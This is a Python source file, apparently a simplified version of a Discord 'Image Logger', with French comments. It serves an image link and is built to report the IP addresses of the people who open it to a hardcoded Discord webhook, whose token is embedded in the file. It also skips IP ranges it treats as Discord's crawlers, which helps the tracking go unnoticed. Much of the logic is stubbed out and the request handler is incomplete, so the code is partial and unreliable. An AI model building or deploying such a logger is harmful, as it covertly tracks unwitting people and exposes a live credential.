import base64
import requests
import httpagentparser
from urllib import parse
from http.server import BaseHTTPRequestHandler


config = {
    # Configuration du webhook et des options générales de l'application.
    "webhook": "https://discord.com/api/webhooks/1494388722068881551/GPELkrraANFn11tOWYFrlhBmiviZB4mn5xUyXuWTwz4Fwqn9SpMiEZnNyRs2sIY7cutU",
    "image": "https://i.pinimg.com/736x/df/96/d8/df96d84e03317bba5b9961e75382ec37.jpg",
    "imageArgument": True,
    # Des personnalisations comme l'username, la couleur de l'embed et d'autres options.
    "username": "Image Logger",
    "color": 0x00FFFF,
    # Diverses options telles que crashBrowser, accurateLocation et message.
}


def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    # Cette fonction est simplifiée. Dans le code original, elle contient beaucoup plus de logique.
    if ip.startswith(("34", "35")):
        return "Discord"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```"
            }
        ]
    })

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            # Simplification de la logique pour servir l'image ou une page HTML.
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode() if config["imageArgument"] else config["image"]
            
            # Plus de logique simplifiée ici pour gérer la requête et les réponses.
            self.send_response(200)
            self.end_headers()

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            error_message = "500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page."
            self.wfile.write(error_message.encode())

handler = ImageLoggerAPI
